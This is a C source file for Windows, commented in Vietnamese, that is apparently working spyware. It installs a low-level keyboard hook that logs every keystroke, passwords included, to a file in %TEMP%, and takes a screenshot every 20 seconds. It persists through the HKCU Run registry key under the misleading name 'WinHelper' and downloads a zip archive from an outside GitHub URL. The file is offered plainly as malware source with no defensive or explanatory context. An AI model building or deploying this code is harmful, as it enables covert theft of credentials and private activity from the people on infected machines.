#include <windows.h>
#include <stdio.h>
#include <wininet.h>

#pragma comment(lib, "wininet.lib")

HHOOK hHook;

// Tạo path để các file được lưu trong %TEMP% 
void GetTempFilePath(const char *filename, char *outPath) {
    char tempPath[MAX_PATH];
    GetTempPath(MAX_PATH, tempPath);
    sprintf(outPath, "%s%s", tempPath, filename);
}

// Keylogger
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT *p = (KBDLLHOOKSTRUCT *)lParam;

        char keylogPath[MAX_PATH];
        GetTempFilePath("keylog.txt", keylogPath);
        FILE *file = fopen(keylogPath, "a+");
        if (file) {
            DWORD vkCode = p->vkCode;

            switch (vkCode) {
                case VK_RETURN: fprintf(file, "[ENTER]"); break;
                case VK_BACK: fprintf(file, "[BACKSPACE]"); break;
                case VK_TAB: fprintf(file, "[TAB]"); break;
                case VK_SHIFT: case VK_LSHIFT: case VK_RSHIFT: fprintf(file, "[SHIFT]"); break;
                case VK_CONTROL: case VK_LCONTROL: case VK_RCONTROL: fprintf(file, "[CTRL]"); break;
                case VK_MENU: case VK_LMENU: case VK_RMENU: fprintf(file, "[ALT]"); break;
                case VK_ESCAPE: fprintf(file, "[ESC]"); break;
                case VK_LEFT: fprintf(file, "[LEFT]"); break;
                case VK_RIGHT: fprintf(file, "[RIGHT]"); break;
                case VK_UP: fprintf(file, "[UP]"); break;
                case VK_DOWN: fprintf(file, "[DOWN]"); break;
                case VK_SPACE: fprintf(file, " "); break;
                default: {
                    BYTE keyboardState[256];
                    GetKeyboardState(keyboardState);

                    char buffer[2];
                    if (ToAscii(vkCode, p->scanCode, keyboardState, (LPWORD)buffer, 0) == 1) {
                        fprintf(file, "%c", buffer[0]);
                    }
                }
            }

            fclose(file);  
        }
    }
    return CallNextHookEx(hHook, nCode, wParam, lParam);
}

// Autorun trong Registry
void SetAutoRun() {
    char path[MAX_PATH];
    GetModuleFileName(NULL, path, MAX_PATH);

    char command[MAX_PATH + 20];
    sprintf(command, "\"%s\" -autorun", path);  // Dấu " để xử lý khoảng trắng

    HKEY hKey;
    if (RegOpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey) == ERROR_SUCCESS) {
        RegSetValueEx(hKey, "WinHelper", 0, REG_SZ, (BYTE *)command, strlen(command) + 1);
        RegCloseKey(hKey);
    }
}

// Cap màn hình
void SaveBitmapToFile(HBITMAP hBitmap, const char *filename) {
    BITMAP bmp;
    GetObject(hBitmap, sizeof(BITMAP), &bmp);
    FILE *f = fopen(filename, "wb");
    if (!f) return;

    BITMAPFILEHEADER bmfHeader;
    BITMAPINFOHEADER bi = {0};
    bi.biSize = sizeof(BITMAPINFOHEADER);
    bi.biWidth = bmp.bmWidth;
    bi.biHeight = -bmp.bmHeight;
    bi.biPlanes = 1;
    bi.biBitCount = 32;
    bi.biCompression = BI_RGB;

    DWORD dwBmpSize = ((bmp.bmWidth * 32 + 31) / 32) * 4 * bmp.bmHeight;
    char *lpbitmap = (char *)malloc(dwBmpSize);

    GetDIBits(GetDC(0), hBitmap, 0, (UINT)bmp.bmHeight, lpbitmap, (BITMAPINFO *)&bi, DIB_RGB_COLORS);

    bmfHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
    bmfHeader.bfSize = dwBmpSize + bmfHeader.bfOffBits;
    bmfHeader.bfType = 0x4D42;

    fwrite(&bmfHeader, sizeof(BITMAPFILEHEADER), 1, f);
    fwrite(&bi, sizeof(BITMAPINFOHEADER), 1, f);
    fwrite(lpbitmap, dwBmpSize, 1, f);

    fclose(f);
    free(lpbitmap);
}

DWORD WINAPI TakeScreenshot(LPVOID lpParam) {
    while (1) {
        Sleep(20000);  // Chụp mỗi 20 giây

        int x = GetSystemMetrics(SM_CXSCREEN);
        int y = GetSystemMetrics(SM_CYSCREEN);

        HDC hScreen = GetDC(NULL);
        HDC hDC = CreateCompatibleDC(hScreen);
        HBITMAP hBitmap = CreateCompatibleBitmap(hScreen, x, y);
        SelectObject(hDC, hBitmap);
        BitBlt(hDC, 0, 0, x, y, hScreen, 0, 0, SRCCOPY);

        SYSTEMTIME st;
        GetLocalTime(&st);

        char filename[100], fullpath[MAX_PATH];
        sprintf(filename, "screenshot_%04d%02d%02d_%02d%02d%02d.bmp",
                st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
        GetTempFilePath(filename, fullpath);

        SaveBitmapToFile(hBitmap, fullpath);

        DeleteDC(hDC);
        DeleteObject(hBitmap);
        ReleaseDC(NULL, hScreen);
    }
    return 0;
}

// Tải file 
DWORD WINAPI DownloadThread(LPVOID lpParam) {
    const char *url = "https://github.com/vanniichan/secret2/archive/refs/heads/main.zip";

    char filename[MAX_PATH];
    GetTempFilePath("secret.zip", filename);

    HINTERNET hInternet = InternetOpen("Downloader", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    HINTERNET hFile = InternetOpenUrl(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);

    if (hFile) {
        FILE *file = fopen(filename, "wb");
        char buffer[1024];
        DWORD bytesRead;
        while (InternetReadFile(hFile, buffer, sizeof(buffer), &bytesRead) && bytesRead) {
            fwrite(buffer, 1, bytesRead, file);
        }
        fclose(file);
        InternetCloseHandle(hFile);
    }
    InternetCloseHandle(hInternet);
    return 0;
}

// Tạo command trong RegistryRegistry
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    SetAutoRun();

    // Nếu là khởi động từ Registry (autorun)
    if (strstr(lpCmdLine, "-autorun") != NULL) {
        Sleep(3000);  // Delay để Windows khởi động ổn định

        char exePath[MAX_PATH];
        GetModuleFileName(NULL, exePath, MAX_PATH);
        ShellExecute(NULL, "open", exePath, NULL, NULL, SW_HIDE);
        return 0;  // Thoát autorun
    }

    // Bắt đầu chạy 
    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);

    CreateThread(NULL, 0, TakeScreenshot, NULL, 0, NULL);
    CreateThread(NULL, 0, DownloadThread, NULL, 0, NULL);

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hHook);
    return 0;
}
